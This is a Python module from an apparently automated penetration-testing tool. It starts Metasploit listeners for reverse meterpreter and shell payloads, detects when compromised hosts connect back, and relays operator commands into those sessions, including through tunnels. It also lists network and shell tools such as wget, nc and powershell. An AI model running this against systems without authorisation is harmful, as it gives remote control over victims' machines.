"""
KMN-CyberSeek Shell Session Manager

Manages persistent Metasploit multi/handler processes and tracks active
meterpreter / reverse-shell sessions that result from successful exploits.

Architecture
------------
- MsfHandlerProcess  — wraps one long-running `msfconsole` with a
  multi/handler configured for a specific LHOST:LPORT:payload triplet.
  stdin is a PIPE (intentionally — we write commands to running sessions).
  stdout is monitored line-by-line for session-opened events and command
  output markers.

- ShellSession       — one active meterpreter or shell session inside an
  MsfHandlerProcess. Commands are sent via the parent handler's stdin and
  output is captured using a unique echo-marker sentinel.

- ShellManager       — top-level container per pentest session; holds all
  handlers and exposes the public API used by the orchestrator.

Limitations
-----------
- Command output capture relies on msfconsole printing the echo marker,
  which works for shell sessions but is less reliable for meterpreter
  (meterpreter does not echo stdin). For meterpreter we use `run cmd`
  wrappers and collect output until the prompt returns.
- If the backend restarts the MsfHandlerProcess (and its subprocess) die.
  Handler config is persisted to DB so the user can restart from the UI.
"""

import asyncio
import ipaddress
import logging
import os
import re
import signal
import uuid
from datetime import datetime
from typing import Callable, Dict, List, Optional

logger = logging.getLogger(__name__)

# Regex patterns for detecting new sessions in msfconsole stdout
_METER_RE = re.compile(
    r'Meterpreter session (\d+) opened.*?(\d{1,3}(?:\.\d{1,3}){3}:\d+)'
    r'\s*->\s*(\d{1,3}(?:\.\d{1,3}){3})',
    re.IGNORECASE,
)
_SHELL_RE = re.compile(
    r'Command shell session (\d+) opened.*?->\s*(\d{1,3}(?:\.\d{1,3}){3})',
    re.IGNORECASE,
)
_LISTENING_RE = re.compile(r'Started reverse|Exploit running|Listening on', re.IGNORECASE)

CMD_OUTPUT_TIMEOUT = 20   # seconds to wait for command output marker
MAX_BUFFER_LINES   = 600  # rolling stdout buffer size

COMMON_PAYLOADS = [
    "windows/x64/meterpreter/reverse_tcp",
    "windows/meterpreter/reverse_tcp",
    "linux/x64/meterpreter/reverse_tcp",
    "linux/x86/meterpreter/reverse_tcp",
    "windows/x64/shell/reverse_tcp",
    "linux/x64/shell/reverse_tcp",
    "python/meterpreter/reverse_tcp",
    "java/meterpreter/reverse_tcp",
]


def _valid_host(value: str) -> bool:
    value = (value or "").strip()
    if not value or len(value) > 253 or any(c in value for c in "\r\n;|&`$"):
        return False
    try:
        ipaddress.ip_address(value)
        return True
    except ValueError:
        return bool(re.fullmatch(r"[A-Za-z0-9.-]+", value)) and not value.startswith(".")


def validate_handler_config(lhost: str, lport: int, payload: str) -> Optional[str]:
    """Validate values that are written into a Metasploit resource file."""
    if not _valid_host(lhost):
        return "Invalid callback host"
    if not isinstance(lport, int) or not 1 <= lport <= 65535:
        return "Callback port must be between 1 and 65535"
    if payload not in COMMON_PAYLOADS:
        return "Payload is not in the supported payload allowlist"
    return None


# ── Data classes ──────────────────────────────────────────────────────────────

class ShellSession:
    """One active meterpreter or shell session inside a handler process."""

    def __init__(self, msf_id: int, session_type: str, target_ip: str,
                 lhost: str, lport: int, payload: str):
        self.shell_id        = uuid.uuid4().hex[:8]
        self.msf_id          = msf_id
        self.session_type    = session_type   # 'meterpreter' | 'shell'
        self.target_ip       = target_ip
        self.lhost           = lhost
        self.lport           = lport
        self.payload         = payload
        self.status          = "open"
        self.opened_at       = datetime.now().isoformat()
        self.last_active     = self.opened_at
        self.command_history: List[Dict] = []   # [{command, output, timestamp}]

    def to_dict(self) -> Dict:
        return {
            "shell_id":       self.shell_id,
            "msf_id":         self.msf_id,
            "type":           self.session_type,
            "target_ip":      self.target_ip,
            "payload":        self.payload,
            "status":         self.status,
            "opened_at":      self.opened_at,
            "last_active":    self.last_active,
            "command_count":  len(self.command_history),
        }


# ── Handler process ───────────────────────────────────────────────────────────

class MsfHandlerProcess:
    """Wraps a single long-running msfconsole multi/handler subprocess."""

    def __init__(self, lhost: str, lport: int, payload: str,
                 on_session_opened: Optional[Callable[[str, Dict], None]] = None,
                 bind_host: Optional[str] = None, bind_port: Optional[int] = None):
        self.handler_id   = uuid.uuid4().hex[:8]
        self.lhost        = lhost          # advertised address (payload LHOST)
        self.lport        = lport          # advertised port (payload LPORT)
        # Where the listener actually binds. Differs from lhost/lport when the
        # callback goes through a tunnel or port-forward (ngrok / reverse-SSH /
        # public IP): the target connects to lhost:lport, which is routed to this
        # local bind. Defaults to the advertised address (direct LAN/VPS case).
        self.bind_host    = bind_host or lhost
        self.bind_port    = bind_port or lport
        self.payload      = payload
        self.status       = "starting"    # starting | listening | stopped | error
        self.started_at   = datetime.now().isoformat()
        # Fired with (handler_id, session_dict) whenever a new meterpreter/shell
        # session is detected in stdout. Lets the orchestrator persist the caught
        # session and surface it without polling. Best-effort — never blocks.
        self._on_session_opened = on_session_opened

        self._process: Optional[asyncio.subprocess.Process] = None
        self._monitor_task: Optional[asyncio.Task]          = None
        self._rc_path: Optional[str] = None
        self._buffer: List[str]        = []
        self._sessions: Dict[int, ShellSession] = {}

        # Output capture state for run_command()
        self._pending_marker: Optional[str]  = None
        self._marker_event: asyncio.Event    = asyncio.Event()
        self._buf_snapshot_start: int        = 0
        # msfconsole has one stdin/stdout stream. Serialize commands so one
        # operator request cannot overwrite another request's marker state.
        self._command_lock = asyncio.Lock()

    # ── Lifecycle ─────────────────────────────────────────────────────────────

    async def start(self) -> bool:
        """Launch msfconsole with multi/handler. Returns True on success."""
        validation_error = validate_handler_config(self.lhost, self.lport, self.payload)
        if validation_error:
            logger.error(f"[Handler {self.handler_id}] {validation_error}")
            self.status = "error"
            return False
        rc_path = f"/tmp/kmn_handler_{self.handler_id}.rc"
        self._rc_path = rc_path
        # LHOST/LPORT are what the payload dials (the reachable, advertised
        # address). When the listener must bind elsewhere — behind a tunnel or a
        # port-forward — ReverseListenerBindAddress/Port point the actual socket
        # at the local endpoint while the payload still targets the public one.
        bind_lines = ""
        if (self.bind_host, self.bind_port) != (self.lhost, self.lport):
            bind_lines = (
                f"set ReverseListenerBindAddress {self.bind_host}\n"
                f"set ReverseListenerBindPort {self.bind_port}\n"
            )
        rc_lines = (
            f"use multi/handler\n"
            f"set PAYLOAD {self.payload}\n"
            f"set LHOST {self.lhost}\n"
            f"set LPORT {self.lport}\n"
            f"{bind_lines}"
            f"set ExitOnSession false\n"
            f"set VERBOSE true\n"
            f"exploit -j -z\n"
        )
        try:
            with open(rc_path, "w") as fh:
                fh.write(rc_lines)
        except OSError as e:
            logger.error(f"[Handler {self.handler_id}] Cannot write RC file: {e}")
            self.status = "error"
            return False

        try:
            self._process = await asyncio.create_subprocess_exec(
                "msfconsole", "-q", "-r", rc_path,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
        except Exception as e:
            logger.error(f"[Handler {self.handler_id}] Failed to start msfconsole: {e}")
            self.status = "error"
            return False

        self._monitor_task = asyncio.create_task(self._monitor())
        # Do not report a listener as ready until msfconsole has emitted a
        # readiness line. This prevents exploits from racing a still-starting
        # handler and makes startup failures retryable.
        for _ in range(40):
            if self.status == "listening":
                break
            if self._process.returncode is not None:
                self.status = "error"
                return False
            await asyncio.sleep(0.25)
        if self.status != "listening":
            logger.error(f"[Handler {self.handler_id}] Listener did not become ready")
            await self.stop()
            self.status = "error"
            return False
        logger.info(
            f"[Handler {self.handler_id}] Started: {self.lhost}:{self.lport} "
            f"payload={self.payload}"
        )
        return True

    async def stop(self):
        """Gracefully terminate the handler."""
        if self._process and self._process.returncode is None:
            try:
                self._process.stdin.write(b"exit -y\n")
                await self._process.stdin.drain()
                await asyncio.sleep(0.5)
            except Exception:
                pass
            try:
                self._process.terminate()
            except Exception:
                pass
        if self._monitor_task:
            self._monitor_task.cancel()
        if self._process and self._process.returncode is None:
            try:
                await asyncio.wait_for(self._process.wait(), timeout=2)
            except (asyncio.TimeoutError, ProcessLookupError):
                try:
                    os.killpg(os.getpgid(self._process.pid), signal.SIGKILL)
                except (ProcessLookupError, PermissionError, OSError):
                    try:
                        self._process.kill()
                    except ProcessLookupError:
                        pass
                try:
                    await self._process.wait()
                except Exception:
                    pass
        if self._monitor_task:
            await asyncio.gather(self._monitor_task, return_exceptions=True)
        for sess in self._sessions.values():
            sess.status = "closed"
        if self._rc_path:
            try:
                os.unlink(self._rc_path)
            except FileNotFoundError:
                pass
            except OSError as exc:
                logger.debug(f"[Handler {self.handler_id}] RC cleanup failed: {exc}")
        self.status = "stopped"
        logger.info(f"[Handler {self.handler_id}] Stopped")

    # ── stdout monitor ────────────────────────────────────────────────────────

    async def _monitor(self):
        """Read msfconsole stdout, detect new sessions, capture command output."""
        while self._process and self._process.returncode is None:
            try:
                raw = await asyncio.wait_for(
                    self._process.stdout.readline(), timeout=1.0
                )
            except asyncio.TimeoutError:
                continue
            except Exception:
                break

            if not raw:
                break

            line = raw.decode("utf-8", errors="replace").rstrip()
            self._buffer.append(line)
            if len(self._buffer) > MAX_BUFFER_LINES:
                self._buffer = self._buffer[-MAX_BUFFER_LINES:]

            logger.debug(f"[MSF-{self.handler_id}] {line}")

            # Handler is now listening
            if _LISTENING_RE.search(line):
                self.status = "listening"

            # Meterpreter session opened
            m = _METER_RE.search(line)
            if m:
                msf_id    = int(m.group(1))
                target_ip = m.group(3)
                sess = ShellSession(msf_id, "meterpreter", target_ip,
                                    self.lhost, self.lport, self.payload)
                self._sessions[msf_id] = sess
                logger.info(
                    f"[Handler {self.handler_id}] Meterpreter session {msf_id} "
                    f"from {target_ip}"
                )
                self._notify_session_opened(sess)
                continue

            # Command shell session opened
            m2 = _SHELL_RE.search(line)
            if m2:
                msf_id    = int(m2.group(1))
                target_ip = m2.group(2)
                sess = ShellSession(msf_id, "shell", target_ip,
                                    self.lhost, self.lport, self.payload)
                self._sessions[msf_id] = sess
                logger.info(
                    f"[Handler {self.handler_id}] Shell session {msf_id} from {target_ip}"
                )
                self._notify_session_opened(sess)
                continue

            # Output-capture marker (sent by run_command)
            if self._pending_marker and self._pending_marker in line:
                self._marker_event.set()

        self.status = "stopped"
        for sess in self._sessions.values():
            sess.status = "closed"
        logger.info(f"[Handler {self.handler_id}] Process exited")

    def _notify_session_opened(self, sess: "ShellSession") -> None:
        """Fire the on_session_opened callback (best-effort, never raises)."""
        if not self._on_session_opened:
            return
        try:
            info = sess.to_dict()
            info["handler_id"] = self.handler_id
            self._on_session_opened(self.handler_id, info)
        except Exception as e:
            logger.warning(f"[Handler {self.handler_id}] on_session_opened callback failed: {e}")

    # ── Command execution ─────────────────────────────────────────────────────

    async def run_command(self, msf_id: int, command: str) -> str:
        async with self._command_lock:
            return await self._run_command(msf_id, command)

    async def _run_command(self, msf_id: int, command: str) -> str:
        """Run a command in an active session and return captured output."""
        if not self._process or self._process.returncode is not None:
            return "[Error: handler process is not running]"
        if msf_id not in self._sessions:
            return f"[Error: session {msf_id} not tracked by this handler]"

        sess   = self._sessions[msf_id]
        marker = f"__KMN_{uuid.uuid4().hex[:10]}__"

        self._pending_marker = marker
        self._marker_event.clear()
        buf_start = len(self._buffer)

        # Build the command block depending on session type.
        # For meterpreter we wrap OS commands with `shell` or use built-ins.
        # For plain shells, echo-marker works directly.
        if sess.session_type == "meterpreter":
            # meterpreter built-ins (pwd, ls, sysinfo, getuid, ps, etc.) work
            # directly.  OS commands need 'shell -c' prefix.
            if _is_os_command(command):
                cmd_block = (
                    f"sessions -i {msf_id}\n"
                    f"shell -c \"{command.replace(chr(34), chr(39))}\"\n"
                    f"background\n"
                    f"echo {marker}\n"
                )
            else:
                cmd_block = (
                    f"sessions -i {msf_id}\n"
                    f"{command}\n"
                    f"background\n"
                    f"echo {marker}\n"
                )
        else:
            # Plain shell — echo marker directly
            cmd_block = (
                f"sessions -i {msf_id}\n"
                f"{command}\n"
                f"echo {marker}\n"
                f"\x03\n"     # Ctrl+C to return to msf> prompt
            )

        try:
            self._process.stdin.write(cmd_block.encode())
            await self._process.stdin.drain()
        except Exception as e:
            self._pending_marker = None
            return f"[Error writing to handler stdin: {e}]"

        try:
            await asyncio.wait_for(self._marker_event.wait(), timeout=CMD_OUTPUT_TIMEOUT)
        except asyncio.TimeoutError:
            logger.warning(
                f"[Handler {self.handler_id}] Timeout waiting for command output "
                f"(session {msf_id}: {command[:60]})"
            )

        self._pending_marker = None

        # Collect lines between buf_start and the marker, strip MSF prompt noise
        raw_lines = self._buffer[buf_start:]
        clean = [
            l for l in raw_lines
            if not l.startswith("msf")
            and marker not in l
            and not l.strip().startswith("[*] Started")
        ]
        output = "\n".join(clean).strip() or "[No output captured within timeout]"

        record = {
            "command":   command,
            "output":    output,
            "timestamp": datetime.now().isoformat(),
        }
        sess.command_history.append(record)
        if len(sess.command_history) > 100:
            sess.command_history = sess.command_history[-100:]
        sess.last_active = record["timestamp"]

        return output

    async def run_console_command(self, command: str) -> str:
        """Run a non-interactive command in the persistent MSF console itself."""
        if not self._process or self._process.returncode is not None:
            return "[Error: handler process is not running]"
        marker = f"__KMN_CONSOLE_{uuid.uuid4().hex[:10]}__"
        async with self._command_lock:
            self._pending_marker = marker
            self._marker_event.clear()
            start = len(self._buffer)
            try:
                self._process.stdin.write(
                    f"{command}\necho {marker}\n".encode()
                )
                await self._process.stdin.drain()
                await asyncio.wait_for(self._marker_event.wait(), timeout=CMD_OUTPUT_TIMEOUT)
            except asyncio.TimeoutError:
                pass
            except Exception as exc:
                self._pending_marker = None
                return f"[Error writing to handler stdin: {exc}]"
            finally:
                self._pending_marker = None
            lines = self._buffer[start:]
            clean = [
                line for line in lines
                if not line.startswith("msf")
                and marker not in line
                and not line.strip().startswith("[*] Started")
            ]
            return "\n".join(clean).strip() or "[No output captured within timeout]"

    # ── Public accessors ──────────────────────────────────────────────────────

    def get_sessions(self) -> List[Dict]:
        return [s.to_dict() for s in self._sessions.values()]

    def get_session(self, msf_id: int) -> Optional[ShellSession]:
        return self._sessions.get(msf_id)

    def get_command_history(self, msf_id: int) -> List[Dict]:
        sess = self._sessions.get(msf_id)
        return sess.command_history if sess else []

    @property
    def info(self) -> Dict:
        return {
            "handler_id":    self.handler_id,
            "lhost":         self.lhost,
            "lport":         self.lport,
            "payload":       self.payload,
            "status":        self.status,
            "started_at":    self.started_at,
            "session_count": len(self._sessions),
            "sessions":      self.get_sessions(),
        }


# ── Shell manager (per pentest session) ───────────────────────────────────────

class ShellManager:
    """Top-level manager — one instance per pentest session."""

    def __init__(self, pentest_session_id: str):
        self.pentest_session_id = pentest_session_id
        self._handlers: Dict[str, MsfHandlerProcess] = {}   # handler_id -> handler

    async def start_handler(self, lhost: str, lport: int,
                            payload: str = "windows/x64/meterpreter/reverse_tcp",
                            on_session_opened: Optional[Callable[[str, Dict], None]] = None,
                            bind_host: Optional[str] = None,
                            bind_port: Optional[int] = None,
                            ) -> MsfHandlerProcess:
        """Start (or reuse) a multi/handler.

        ``lhost``/``lport`` are the advertised (payload) address; ``bind_host``/
        ``bind_port`` are where the listener actually binds and default to the
        advertised address. Handlers are deduplicated on the local bind socket,
        which is what can actually collide.
        """
        b_host = bind_host or lhost
        b_port = bind_port or lport
        validation_error = validate_handler_config(lhost, lport, payload)
        if validation_error:
            raise ValueError(validation_error)
        if not _valid_host(b_host) or not isinstance(b_port, int) or not 1 <= b_port <= 65535:
            raise ValueError("Invalid listener bind address or port")
        key = f"{lhost}:{lport} (bind {b_host}:{b_port})"
        # Reuse an existing live handler bound to the same local socket.
        for h in self._handlers.values():
            if (h.bind_host == b_host and h.bind_port == b_port
                    and h.status in ("listening", "starting")
                    and h.payload == payload):
                logger.info(f"Reusing handler {h.handler_id} for {key}")
                return h
            if (h.bind_host == b_host and h.bind_port == b_port
                    and h.status in ("listening", "starting")
                    and h.payload != payload):
                raise ValueError(
                    f"Listener {b_host}:{b_port} is already bound for payload {h.payload}"
                )

        handler = MsfHandlerProcess(
            lhost, lport, payload, on_session_opened=on_session_opened,
            bind_host=b_host, bind_port=b_port,
        )
        self._handlers[handler.handler_id] = handler
        if not await handler.start():
            self._handlers.pop(handler.handler_id, None)
            raise RuntimeError(
                f"Metasploit handler {handler.handler_id} failed to become ready"
            )
        return handler

    async def stop_handler(self, handler_id: str) -> bool:
        h = self._handlers.get(handler_id)
        if not h:
            return False
        await h.stop()
        return True

    async def stop_all(self):
        for h in self._handlers.values():
            await h.stop()

    def get_handler(self, handler_id: str) -> Optional[MsfHandlerProcess]:
        return self._handlers.get(handler_id)

    def all_handlers(self) -> List[Dict]:
        return [h.info for h in self._handlers.values()]

    def all_sessions(self) -> List[Dict]:
        result = []
        for h in self._handlers.values():
            for s in h.get_sessions():
                s["handler_id"] = h.handler_id
                result.append(s)
        return result

    async def run_command(self, handler_id: str, msf_id: int, command: str) -> str:
        h = self._handlers.get(handler_id)
        if not h:
            return f"[Handler {handler_id} not found]"
        return await h.run_command(msf_id, command)

    async def run_console_command(self, handler_id: str, command: str) -> str:
        h = self._handlers.get(handler_id)
        if not h:
            return f"[Handler {handler_id} not found]"
        return await h.run_console_command(command)

    def has_active_sessions(self) -> bool:
        return any(
            s["status"] == "open"
            for h in self._handlers.values()
            for s in h.get_sessions()
        )


# ── Helpers ───────────────────────────────────────────────────────────────────

_OS_CMD_PREFIXES = (
    "whoami", "id", "hostname", "uname", "cat ", "ls ", "dir ", "pwd",
    "ps ", "netstat", "ss ", "ip ", "ifconfig", "arp", "find ", "grep ",
    "echo ", "env", "set ", "export", "cd ", "cp ", "mv ", "rm ", "mkdir",
    "wget", "curl", "nc ", "python", "bash", "sh ", "cmd", "powershell",
    "net ", "reg ", "tasklist", "systeminfo", "ipconfig", "whoami",
)

def _is_os_command(cmd: str) -> bool:
    """Heuristic: does this look like a shell/OS command vs a meterpreter built-in?"""
    lower = cmd.strip().lower()
    return any(lower.startswith(p) for p in _OS_CMD_PREFIXES)


def get_local_ip() -> str:
    """Best-effort: return the primary non-loopback IP of this machine."""
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"
